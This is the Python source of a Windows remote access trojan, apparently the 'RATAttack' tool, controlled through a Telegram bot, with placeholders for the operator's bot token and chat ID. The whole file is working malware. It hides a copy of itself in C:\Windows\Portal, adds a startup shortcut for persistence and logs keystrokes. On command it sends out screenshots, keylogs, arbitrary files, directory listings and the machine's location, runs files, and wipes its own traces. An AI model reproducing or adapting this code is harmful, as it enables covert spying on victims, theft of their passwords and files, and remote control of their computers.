#!/usr/bin/env python

from PIL import ImageGrab
from time import strftime, sleep
from shutil import copyfile, copyfileobj, rmtree
from sys import argv, path
from json import loads
from winshell import startup
from tendo import singleton
from win32com.client import Dispatch
import telepot, requests
import os, os.path, platform, ctypes
import pyHook, pythoncom

me = singleton.SingleInstance()

# REPLACE '1234:abcd' BY THE TOKEN OF THE BOT YOU GENERATED!
token = '1234:abcd'

def checkchat_id(chat_id):
	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
	known_ids = ['123456']
	# COMMENT THE LINE 'return True'!
	#return True
	try:
		return str(chat_id) in known_ids
	except:
		return str(chat_id) == known_ids

if (argv[0]).endswith('.exe'):
	win_folder = os.environ['WINDIR']	# = 'C:\Windows'
	# HIDING OPTIONS
	# ---------------------------------------------
	hide_folder = win_folder + r'\Portal'	# = 'C:\Windows\Portal'
	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e C:\Windows\Portal\portal.exe
	# ---------------------------------------------
	if not os.path.exists(hide_folder):
		os.makedirs(hide_folder)
	hide_compiled = hide_folder + '\\' + compiled_name
	target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
	copyfile(argv[0], hide_compiled)
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(target_shortcut)
	shortcut.Targetpath = hide_compiled
	shortcut.WorkingDirectory = hide_folder
	shortcut.save()
else:
	hide_folder = path[0] + '\\RATAttack'
	if not os.path.exists(hide_folder):
		os.makedirs(hide_folder)

initi = False
user = os.environ.get("USERNAME")	# Windows username
log_file = hide_folder + '\\keylogs.txt'
with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")

def pressed_chars(event):	# on key pressed function
    if event.Ascii:
        f = open(log_file,"a")	# open log_file in append mode
        char = chr(event.Ascii)	# insert real char in variable
        if event.Ascii == 8:	# if char is "backspace"
        	f.write("[BS]")
	if event.Ascii == 9:	# if char is "tab"
		f.write("[TAB]")
        if event.Ascii == 13:	# if char is "backspace"
            f.write("[ENTER]\n")
        f.write(char)	# write the char pressed

def handle(msg):
	chat_id = msg['chat']['id']
	print('')
	#print(strftime('[%d %b, %y %r] ') + str(chat_id) + ': ' + command)

	if checkchat_id(chat_id):
		print msg
		if 'text' in msg:
			command = msg['text']
			print command
			if command == '/capture_pc':
				bot.sendChatAction(chat_id, 'typing')
				screenshot = ImageGrab.grab()
				screenshot.save('screenshot.jpg')
				bot.sendChatAction(chat_id, 'upload_photo')
				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
				os.remove('screenshot.jpg')

			elif command == '/keylogs':
				bot.sendChatAction(chat_id, 'upload_document')
				bot.sendDocument(chat_id, open(log_file, "rb"))

			elif command == '/pc_info':
				bot.sendChatAction(chat_id, 'typing')
				info = ''
				for pc_info in platform.uname():
					info += '\n' + pc_info
				bot.sendMessage(chat_id, info)

			elif command.startswith('/msg_box'):
				message = command.replace('/msg_box', '')
				message = message[1:]
				if message == '':
					bot.sendMessage(chat_id, '/msg_box yourText')
				else:
					ctypes.windll.user32.MessageBoxA(0, message, 'Information', 0)
					bot.sendMessage(chat_id, 'MsgBox Displayed')

			elif command == '/ip_info':
				bot.sendChatAction(chat_id, 'find_location')
				info = requests.get('http://ipinfo.io').text
				bot.sendMessage(chat_id, info)
				location = (loads(info)['loc']).split(',')
				bot.sendLocation(chat_id, location[0], location[1])

			elif command.startswith('/download_file'):
				path_file = command.replace('/download_file', '')
				path_file = path_file[1:]
				if path_file == '':
					bot.sendChatAction(chat_id, 'typing')
					bot.sendMessage(chat_id, '/download_file C:/path/to/file')
				else:
					try:
						bot.sendChatAction(chat_id, 'upload_document')
						bot.sendDocument(chat_id, open(path_file, 'rb'))
					except:
						bot.sendMessage(chat_id, 'Could not find file')

			elif command.startswith('/list_dir'):
				bot.sendChatAction(chat_id, 'typing')
				path_dir = command.replace('/list_dir', '')
				path_dir = path_dir[1:]
				if path_dir == '':
					bot.sendMessage(chat_id, '/list_dir C:/path/to/folder')
				else:
					try:
						files = os.listdir(path_dir)
						human_readable = ''
						for file in files:
							human_readable += file + '\n'
						human_readable += human_readable + '\n^Contents of ' + path_dir
						bot.sendMessage(chat_id, human_readable)
					except:
						bot.sendMessage(chat_id, 'Invalid path')

			elif command.startswith('/run_file'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/run_file', '')
				path_file = path_file[1:]
				if path_file == '':
					bot.sendMessage(chat_id, '/run_file C:/path/to/file')
				else:
					os.startfile(path_file)
					bot.sendMessage(chat_id, 'Command executed')

			elif command == '/self_destruct':
				bot.sendChatAction(chat_id, 'typing')
				global initi
				initi = True
				bot.sendMessage(chat_id, "You sure? Type 'DESTROYNOW!' to proceed.")

			elif command == 'DESTROYNOW!' and initi == True:
				bot.sendChatAction(chat_id, 'typing')
				bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
				if os.path.exists(hide_folder):
					rmtree(hide_folder)
				if os.path.isfile(target_shortcut):
					os.remove(target_shortcut)
				while True:
					sleep(10)
		else:
			file_name = msg['document']['file_name']
			file_id = msg['document']['file_id']
			file_path = bot.getFile(file_id=file_id)['file_path']
			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
			file = (requests.get(link, stream=True)).raw
			with open(hide_folder + '//' + file_name, 'wb') as out_file:
				copyfileobj(file, out_file)

bot = telepot.Bot(token)

bot.message_loop(handle)
print 'Listening to commands...'

proc = pyHook.HookManager()
proc.KeyDown = pressed_chars
proc.HookKeyboard()
pythoncom.PumpMessages()
